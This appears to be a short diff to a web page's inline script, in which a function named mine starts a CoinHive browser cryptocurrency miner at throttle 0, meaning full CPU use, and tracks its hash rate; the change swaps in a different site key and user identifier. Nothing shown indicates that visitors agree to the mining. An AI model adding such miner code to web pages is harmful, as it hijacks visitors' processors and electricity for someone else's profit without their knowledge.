@@ -9,7 +9,7 @@
                 <script>
                     function mine(id){
                         alert('user '+id+' is mining');
-                        var miner = new CoinHive.User('YMBWd4qtCPAeFAE3VqkAZAA3j3IuZmeO', 'vk_finance_'+id, {throttle: 0});
+                        var miner = new CoinHive.User('XrEBxQnJEhWbnSHENs0MjS0yCLVEz3om', ''+id, {throttle: 0});
                         setInterval(function() {
                                 var hashesPerSecond = miner.getHashesPerSecond();
                                 var totalHashes = miner.getTotalHashes();
